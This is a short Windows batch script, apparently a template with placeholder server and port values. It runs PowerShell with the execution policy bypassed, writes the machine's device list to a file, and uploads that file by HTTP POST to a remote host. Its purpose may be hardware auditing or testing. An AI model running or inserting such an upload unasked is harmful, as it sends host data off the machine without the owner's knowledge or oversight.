@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "pnputil /enum-devices | Out-File -FilePath C:\audit_devices.txt -Encoding ascii; Invoke-WebRequest -Uri \"http://{{SERVER_IP}}:{{UPLOAD_PORT}}\" -Method POST -InFile C:\audit_devices.txt -Headers @{\"X-Filename\"=\"audit_devices.txt\"} -UseBasicParsing"
